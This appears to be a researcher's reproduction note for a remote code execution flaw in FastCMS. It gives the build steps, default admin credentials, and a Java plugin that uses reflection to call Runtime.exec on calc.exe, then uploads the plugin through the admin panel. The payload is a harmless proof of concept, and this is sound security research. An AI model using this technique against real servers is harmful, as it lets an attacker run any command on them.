# RCE

- windows10
- jdk17
- mysql5.7

## 1、build

```sh
git clone https://github.com/my-fastcms/fastcms.git
cd fastcms
```

SQL

- fastcms/web/src/main/resources/application.yml
- fastcms/doc/sql/fastcms.sql

```sh
.\build.bat
```

![建造完成](D:\Onenote\notes-images\建造完成.png)

## 2、web

```sh
 # fastcms/.dist
 cd .dist
 .\startup.cmd
```

![启动](D:\Onenote\notes-images\启动.png)

login：http://127.0.0.1:8080/fastcms.html，admin/1

## 3、jar

```sh
# fastcms/plugins/hello-world-plugin
cd ../plugins/hello-world-plugin
```

`fastcms/plugins/hello-world-plugin/src/main/java/com/fastcms/hello/HelloPlugin.java`

```java
public void calc() {
    try {
        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
        Method getRuntime = runtimeClass.getMethod("getRuntime");
        Object runtimeObj = getRuntime.invoke(null);
        Method exec = runtimeClass.getMethod("exec", String.class);
        String cmd = "calc.exe";
        exec.invoke(runtimeObj, cmd);
    } catch (Exception e) {

    }
}
```

![构造1](D:\Onenote\notes-images\构造1.png)

```sh
# fastcms/plugins/hello-world-plugin/
mvn clean package
```

![jar文件路径](D:\Onenote\notes-images\jar文件路径.png)

fastcms\plugins\hello-world-plugin\target\hello-world-plugin-0.1.6-SNAPSHOT.jar



**upload**

![安装插件](D:\Onenote\notes-images\安装插件.png)

fastcms\plugins\hello-world-plugin\target\hello-world-plugin-0.1.6-SNAPSHOT.jar

![选择上传](D:\Onenote\notes-images\选择上传.png)



![上传成功](D:\Onenote\notes-images\上传成功.png)